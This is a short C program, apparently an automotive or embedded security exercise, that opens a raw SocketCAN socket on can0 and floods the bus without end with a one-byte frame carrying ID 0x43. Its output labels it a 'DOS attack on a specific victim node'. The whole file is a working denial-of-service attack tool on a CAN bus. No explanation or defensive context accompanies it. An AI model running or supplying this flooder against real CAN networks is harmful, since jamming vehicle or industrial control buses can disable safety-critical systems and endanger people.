#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <linux/can.h>
#include <linux/can/raw.h>
#include <time.h>

int main(int argc, char **argv)
{
    int s, i; 
	int nbytes;
	struct sockaddr_can addr;
	struct ifreq ifr;
	struct can_frame frame;

	printf("DOS attack on a specific victim node\r\n");

	if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0)
	{
		perror("Socket");
		return 1;
	}

	strcpy(ifr.ifr_name, "can0" );
	ioctl(s, SIOCGIFINDEX, &ifr);

	memset(&addr, 0, sizeof(addr));
	addr.can_family = AF_CAN;
	addr.can_ifindex = ifr.ifr_ifindex;

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("Bind");
		return 1;
	}


	frame.can_id = 0x43;
	frame.data[0] = 1;
	frame.can_dlc = 1;
		
	printf("Flooding the target victim with ID 0x%X\n",frame.can_id);
	printf("Message being sent: 0x%X [%d]", frame.can_id, frame.can_dlc);
			
	for (int j = 0; j < frame.can_dlc; j++)
		printf("\t%X", frame.data[j]);
	printf("\r\n");

	while(1)	
		write(s, &frame, sizeof(struct can_frame));

	if (close(s) < 0) {
		perror("Close");
		return 1;
	}

	return 0;
}
